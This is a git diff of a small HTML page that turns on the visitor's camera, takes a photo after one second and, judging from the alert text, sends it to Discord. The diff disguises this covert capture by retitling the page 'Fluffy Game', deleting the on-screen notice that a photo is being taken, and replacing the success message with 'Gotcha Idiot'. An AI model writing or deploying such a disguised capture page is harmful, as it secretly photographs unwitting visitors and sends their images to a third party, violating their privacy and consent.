@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Auto-Capture</title>
+  <title>Fluffy Game</title>
   <style>
     body {
       font-family: sans-serif;
@@ -17,7 +17,6 @@
   </style>
 </head>
 <body>
-  <h2>📷 Capturing image in 3 seconds...</h2>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -32,7 +31,7 @@
       video.onloadedmetadata = () => {
         setTimeout(() => {
           takePhoto();
-        }, 1000); // wait 3 seconds before auto-capture
+        }, 1000); 
       };
     }).catch((err) => {
       alert("Camera access denied");
@@ -54,11 +53,11 @@
       })
       .then(res => res.text())
       .then(msg => {
-        alert("✅ Image sent to Discord!");
+        alert("Gotcha Idiot");
         console.log(msg);
       })
       .catch(err => {
-        alert("❌ Failed to send image");
+        alert("Bruh i lose");
         console.error(err);
       });
     }
